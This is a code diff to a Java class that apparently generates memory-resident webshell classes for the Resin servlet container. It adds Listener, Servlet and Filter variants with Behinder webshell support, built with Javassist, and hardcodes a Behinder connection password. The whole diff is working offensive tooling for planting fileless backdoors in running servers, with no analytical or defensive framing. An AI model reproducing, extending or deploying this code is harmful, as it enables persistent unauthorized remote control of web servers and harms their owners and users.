@@ -204,6 +204,26 @@ public class MSJavaClassBuilder {
     }
 
     @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Listener)
+    @MemShellFunction(MemShellFunction.Behinder)
+    public byte[] resinListenerBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        classPool.insertClassPath(new ClassClassPath(cls));
+        classPool.importPackage("javax.servlet.http");
+
+        CtClass ctClass = classPool.getCtClass(cls.getName());
+
+        // response
+        resinListenerResponseMaker(ctClass);
+
+        behinderMS(javaClassHelper);
+
+        JavaClassModifier.ctClassBuilderNew(cls, ctClass, javaClassHelper);
+
+        return JavaClassModifier.toBytes(ctClass);
+    }
+
+    @Middleware(Middleware.Resin)
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Exec)
     public byte[] resinServletExec(Class cls, JavaClassHelper javaClassHelper) throws Exception {
@@ -214,6 +234,14 @@ public class MSJavaClassBuilder {
     @MemShell(MemShell.Servlet)
     @MemShellFunction(MemShellFunction.Godzilla)
     public byte[] resinServletGodzilla(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
+    @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Servlet)
+    @MemShellFunction(MemShellFunction.Behinder)
+    public byte[] resinServletBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        behinderMS(javaClassHelper);
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
@@ -231,6 +259,14 @@ public class MSJavaClassBuilder {
         return defaultOriginalMS(cls, javaClassHelper);
     }
 
+    @Middleware(Middleware.Resin)
+    @MemShell(MemShell.Filter)
+    @MemShellFunction(MemShellFunction.Behinder)
+    public byte[] resinFilterBehinder(Class cls, JavaClassHelper javaClassHelper) throws Exception {
+        behinderMS(javaClassHelper);
+        return defaultOriginalMS(cls, javaClassHelper);
+    }
+
     public void resinListenerResponseMaker(CtClass ctClass) throws Exception{
         // response
         CtMethod responseCtMethod = ctClass.getDeclaredMethod("getResponse");
@@ -239,6 +275,20 @@ public class MSJavaClassBuilder {
     }
 
 
+    /**
+     * 冰蝎 密码
+     */
+    public static void behinderMS(JavaClassHelper javaClassHelper) throws Exception {
+        javaClassHelper.setPass("e45e329feb5d925b");
+    }
+
+    /**
+     * 默认
+     * @param cls
+     * @param javaClassHelper
+     * @return
+     * @throws Exception
+     */
     public static byte[] defaultOriginalMS(Class cls, JavaClassHelper javaClassHelper) throws Exception {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(cls));
@@ -250,4 +300,6 @@ public class MSJavaClassBuilder {
 
         return JavaClassModifier.toBytes(ctClass);
     }
+
+
 }
